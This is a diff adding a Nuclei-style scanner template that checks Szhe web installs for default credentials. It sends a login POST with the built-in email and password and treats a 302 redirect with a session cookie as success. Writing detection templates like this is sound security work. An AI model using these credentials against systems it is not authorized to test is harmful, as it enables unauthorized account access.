@@ -1,0 +1,43 @@
+id: szhe-default-login
+info:
+  author: pikpikcu
+  classification:
+    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:L/I:N/A:N
+    cvss-score: 5.8
+    cwe-id: CWE-522
+  description: Szhe default login information was discovered.
+  name: Szhe Default Login
+  reference:
+  - https://github.com/Cl0udG0d/SZhe_Scan
+  severity: medium
+  tags: szhe,default-login
+requests:
+- attack: pitchfork
+  matchers:
+  - type: word
+    words:
+    - 'You should be redirected automatically to target URL: <a href="/">/</a>'
+  - part: header
+    type: word
+    words:
+    - 'Set-Cookie: session'
+  - status:
+    - 302
+    type: status
+  matchers-condition: and
+  payloads:
+    password:
+    - springbird
+    username:
+    - springbird@qq.com
+  raw:
+  - 'POST /login/ HTTP/1.1
+
+    Host: {{Hostname}}
+
+    Content-Type: application/x-www-form-urlencoded
+
+
+    email={{username}}&password={{password}}&remeber=true
+
+    '
